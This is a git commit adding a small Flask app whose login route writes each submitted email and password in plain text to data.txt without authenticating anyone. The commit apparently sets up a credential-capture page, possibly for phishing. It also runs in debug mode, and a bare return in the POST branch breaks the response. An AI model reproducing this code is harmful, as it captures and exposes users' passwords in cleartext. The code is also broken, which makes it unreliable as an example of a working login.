f8386cf6d2b76f511ff842fbe92f1f7f59801870
pepperhot <lucas.gemo77@gmail.com>
2025-04-17 17:30:09 +0200

    ajout de tout

---
+++ app.py
@@ -0,0 +1,17 @@
+from flask import Flask, render_template, request
+
+app = Flask(__name__)
+
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        email = request.form['email']
+        password = request.form['password']
+
+        with open("data.txt", "a") as f:
+            f.write(f"Email: {email}, Mot de passe: {password}\n")
+            return
+    return render_template('login.html')
+
+if __name__ == '__main__':
+    app.run(debug=True)
